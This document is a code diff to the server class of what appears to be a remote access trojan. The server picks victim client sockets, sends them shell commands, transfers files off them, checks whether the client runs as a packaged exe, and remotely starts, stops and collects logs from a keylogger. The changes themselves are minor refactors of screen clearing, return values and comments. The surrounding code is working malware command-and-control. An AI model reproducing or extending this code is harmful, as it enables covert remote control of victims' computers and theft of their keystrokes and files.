@@ -328,9 +328,8 @@ class MultiServer(object):
         return
 
     def get_target(self, cmd) -> socket.socket:
-        """ Select target client
-        :param cmd:
-        """
+        """ Select target client """
+        # returns socket.socket()
         target = cmd.split(' ')[-1]
         try:
             target = int(target)
@@ -359,7 +358,7 @@ class MultiServer(object):
 
     def receive_file(self, conn, file_to_transfer, save_as) -> None:
         """ Transfer file from Client to Server """
-
+        # returns None
         self.send(conn, json_dumps(['RECEIVE_FILE', file_to_transfer]))
         with open(save_as, 'wb') as f:
             while 1:
@@ -442,9 +441,11 @@ class MultiServer(object):
             os.system(command)
             return '', self.get_cwd(conn)
         if command.lower().strip() == 'cls' and self.get_platform(conn) == 'Windows':
-            return self.clear_screen(conn=conn, _print=_print), self.get_cwd(conn)
+            os.system('cls')
+            return '', self.get_cwd(conn)
         if command[:5].lower().strip() == 'clear' and self.get_platform(conn) != 'Windows':
-            return self.clear_screen(conn=conn, _print=_print), self.get_cwd(conn)
+            os.system('clear')
+            return '', self.get_cwd(conn)
         self.send(conn, json_dumps(['SHELL', command]))
         result = []
         while 1:
@@ -463,19 +464,11 @@ class MultiServer(object):
                 self.send(conn, b'QUIT')
         return result, self.get_cwd(conn)
 
-    def clear_screen(self, conn=None, _print=True) -> None:
-        """ Clear Screen """
-        if conn != None:
-            if self.get_platform(conn) == 'Windows':
-                self.client_exec(conn, 'os.system("cls")')
-            else:
-                self.client_exec(conn, 'os.system("clear")')
-        if _print:
-            if is_windows():
-                _ = os.system('cls')
-            else:
-                _ = os.system('clear')
-        return ''
+    def is_frozen(self, conn) -> bool:
+        """ Check if the client is frozen (exe) """
+        # returns bool
+        self.send(conn, json_dumps(['FROZEN']))
+        return json_loads(self.receive(conn).decode())
 
     def get_platform(self, conn) -> str:
         """ Get Client Platform """
@@ -493,19 +486,19 @@ class MultiServer(object):
         """ Start Keylogger """
         # returns True/False
         self.send(conn, json_dumps(['START_KEYLOGGER']))
-        return json_loads(self.receive(conn))[0]
+        return json_loads(self.receive(conn))
 
     def keylogger_status(self, conn) -> bool:
         """ Get Keylogger Status """
         # returns True/False
         self.send(conn, json_dumps(['KEYLOGGER_STATUS']))
-        return json_loads(self.receive(conn))[0]
+        return json_loads(self.receive(conn))
 
     def stop_keylogger(self, conn) -> bool:
         """ Stop Keylogger """
         # returns True/False
         self.send(conn, json_dumps(['STOP_KEYLOGGER']))
-        return json_loads(self.receive(conn))[0]
+        return json_loads(self.receive(conn))
 
     def get_log(self, conn, save_as='{}.log'.format(str(datetime.now()).replace(':','-'))) -> str:
         """ Transfer log to Server """
